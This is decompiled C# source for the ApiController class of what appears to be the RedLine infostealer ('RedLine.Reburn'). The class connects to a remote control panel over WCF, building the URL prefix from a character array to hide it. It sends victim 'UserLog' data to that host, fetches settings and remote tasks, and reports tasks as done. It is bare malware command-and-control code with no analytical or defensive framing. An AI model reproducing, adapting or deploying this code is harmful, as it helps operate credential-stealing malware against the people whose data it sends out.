using System;
using System.Collections.Generic;
using System.ServiceModel;
using System.ServiceModel.Channels;
using RedLine.Reburn.Data.Helpers;
using RedLine.Reburn.Models.Core;
using RedLine.Reburn.Models.Info;

namespace RedLine.Reburn.Data.Core;

public class ApiController : IDisposable, ICommunicator
{
	private IApiController remotePanel;

	public bool InitConnection(string address)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		try
		{
			IClientChannel val = (IClientChannel)new ChannelFactory<IApiController>((Binding)(object)SystemInfoHelper.CreateBind()).CreateChannel(new EndpointAddress(string.Format(new string(new char[11]
			{
				'h', 't', 't', 'p', ':', '/', '/', '{', '0', '}',
				'/'
			}), address)));
			remotePanel = val as IApiController;
			return true;
		}
		catch
		{
			return false;
		}
	}

	public bool TryGetSettings(out ClientSettings settings)
	{
		try
		{
			settings = remotePanel.GetSettings();
			return true;
		}
		catch
		{
			settings = new ClientSettings();
			return false;
		}
	}

	public bool TrySendLog(UserLog user)
	{
		try
		{
			remotePanel.SendClientInfo(user);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public bool TryGetTasks(UserLog user, out IList<RemoteTask> remoteTasks)
	{
		try
		{
			remoteTasks = remotePanel.GetTasks(user);
			return true;
		}
		catch
		{
			remoteTasks = new List<RemoteTask>();
			return false;
		}
	}

	public bool TryCompleteTask(UserLog user, int taskId)
	{
		try
		{
			remotePanel.CompleteTask(user, taskId);
			return true;
		}
		catch
		{
			return false;
		}
	}

	public void Dispose()
	{
		Dispose(managed: true);
		GC.SuppressFinalize(this);
	}

	protected virtual void Dispose(bool managed)
	{
		if (managed && remotePanel != null)
		{
			IApiController apiController = remotePanel;
			IApiController obj = ((apiController is IClientChannel) ? apiController : null);
			if (obj != null)
			{
				((ICommunicationObject)obj).Close();
			}
			IApiController apiController2 = remotePanel;
			IApiController obj2 = ((apiController2 is IClientChannel) ? apiController2 : null);
			if (obj2 != null)
			{
				((ICommunicationObject)obj2).Abort();
			}
		}
	}
}
